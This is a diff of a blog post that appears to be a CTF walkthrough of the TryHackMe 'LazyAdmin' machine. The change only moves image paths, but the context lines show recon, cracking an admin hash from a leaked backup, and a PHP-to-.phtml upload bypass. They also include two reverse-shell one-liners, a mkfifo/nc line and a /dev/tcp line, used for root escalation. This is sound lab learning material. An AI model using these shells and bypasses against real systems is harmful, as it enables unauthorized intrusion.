@@ -24,7 +24,7 @@ $ nmap -sCV x.x.x.x
 
 We can see that ports 22 & 80 are open in the nmap scan below
 
-![img]({{ '/assets/images/1-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/1-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 
@@ -42,21 +42,21 @@ $ dirb http://x.x.x.x
 We can see in the screenshot below that there are a few directories of interest
 
 
-![img]({{ '/assets/images/2-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/2-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed yet
 Lets see if there are any obvious vulnerabilities that have not yet been patched
 
 
-![img]({{ '/assets/images/3-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/3-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Moving further into the directory into the "/content/as" page shows us that there is a login page
 
 
 
-![img]({{ '/assets/images/4-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/4-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 I tested different credentials as well as a sqli injection login bypass, but did not have any success
@@ -70,17 +70,17 @@ We show ~30 different files and directories here, but one caught my eye...
 >mysql_backup/
 
 
-![img]({{ '/assets/images/5-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/5-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 
 
-![img]({{ '/assets/images/6-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/6-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets download this file and inspect it ...
 
 
-![img]({{ '/assets/images/7-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/7-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Looking at this file we can see that it shows us an admin username and hashed password
@@ -88,7 +88,7 @@ Looking at this file we can see that it shows us an admin username and hashed pa
 
 
 
-![img]({{ '/assets/images/8-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/8-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 >admin user: manager
@@ -100,7 +100,7 @@ Using [hashes.com](https://hashes.com/en/decrypt/hash), We are able to crack the
 
 
 
-![img]({{ '/assets/images/9-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/9-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 
@@ -109,7 +109,7 @@ Let's try to Login with the new credentials at the login page...
 >Password: [cracked hashed password]
 
 
-![img]({{ '/assets/images/10-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/10-lazyadmin.png' | relative_url }}){: .center-image }
 
 SUCCESS !
 
@@ -117,7 +117,7 @@ Looking around this page for potential vulnerabilites,
 We can see there is the option to upload files on the "MEDIA CENTER" page
 
 
-![img]({{ '/assets/images/11-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/11-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Lets try and upload a known malicious file...
@@ -133,12 +133,12 @@ Lets reload and capture the page in order to modify the request
 Let's try to change the request from of our payload from '.php' to '.phtml' and forward the request
 
 
-![img]({{ '/assets/images/12-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/12-lazyadmin.png' | relative_url }}){: .center-image }
 
 We can see that this bypassed the filter and was succfully uploaded !
 
 
-![img]({{ '/assets/images/13-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/13-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link on the page
 We now get a successful shell on our machine connecting to the target machine
@@ -148,7 +148,7 @@ Lets move into the /home directory and capture the user flag
 
 
 
-![img]({{ '/assets/images/14-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/14-lazyadmin.png' | relative_url }}){: .center-image }
 
 > Flag: THM[redacted]
 
@@ -171,7 +171,7 @@ We can inspect and see that it executes a bash script at '/etc/copy.sh'
 Inspecting this we see there is a  file which shows a script being run
 
 
-![img]({{ '/assets/images/15-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/15-lazyadmin.png' | relative_url }}){: .center-image }
 
 {% highlight bash %}
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
@@ -191,7 +191,7 @@ $  echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
 *So we will need to select a second listener and a different port from the first listener we set up
 
 
-![img]({{ '/assets/images/16-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/16-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets run the command below to start the script
 
@@ -208,7 +208,7 @@ Lets cat out /root/root.txt to capture the ROOT FLAG
 
 
 
-![img]({{ '/assets/images/17-lazyadmin.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/lazyadmin/17-lazyadmin.png' | relative_url }}){: .center-image }
 
 We have now captured the root flag and pwnd the machine !
 
